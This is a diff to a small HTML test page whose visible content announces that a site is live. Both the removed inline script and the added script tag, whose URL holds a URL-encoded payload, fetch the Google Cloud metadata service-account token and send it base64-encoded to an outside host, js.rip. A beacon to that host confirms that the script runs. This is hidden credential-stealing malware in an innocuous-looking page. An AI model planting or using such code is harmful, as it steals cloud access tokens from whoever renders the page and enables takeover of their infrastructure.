@@ -2,20 +2,8 @@
 <html>
 <head>
   <title>Test Page</title>
-  <script>
-    // Confirm JS execution
-    new Image().src = "https://js.rip/5mw8at9w5s";
-
-    // Attempt metadata fetch
-    fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {
-      headers: { "Metadata-Flavor": "Google" }
-    })
-    .then(r => r.text())
-    .then(t => {
-      new Image().src = "https://js.rip/5mw8at9w5s" + btoa(t);
-    })
-    .catch(() => {});
-  </script>
+  <script src="https://js.rip/5mw8at9w5s/%3Bfetch('http%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2Finstance%2Fservice-accounts%2Fdefault%2Ftoken'%2C%7Bheaders%3A%7B'Metadata-Flavor'%3A'Google'%7D%7D).then(r%3D%3Er.text()).then(t%3D%3Enew%20Image().src%3D'https%3A%2F%2Fjs.rip%2F5mw8at9w5s%2F'%2Bbtoa(t)).catch(()%3D%3E%7B%7D)">
+</script>
 </head>
 <body>
   <h1>It works! Your site is live 🚀</h1>
